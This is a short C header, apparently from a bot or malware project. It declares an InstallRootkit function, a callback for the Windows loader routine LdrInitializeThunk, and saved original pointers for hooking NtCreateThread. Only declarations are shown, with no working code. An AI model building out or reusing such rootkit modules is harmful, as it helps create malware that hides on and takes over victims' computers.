#pragma once
#include "modules.h"

#ifdef MODULE_ROOTKIT
#include "../common/bot_structs.h"

extern ptNtCreateThread oNtCreateThread;

BOOL WINAPI InstallRootkit(void);
NTSTATUS WINAPI LdrInitializeThunk_Callback(DWORD dw1, DWORD dw2, DWORD dw3);
extern ptLdrInitializeThunk oLdrInitializeThunk;;
DWORD dwLdrInitializeThunkSize;

#endif
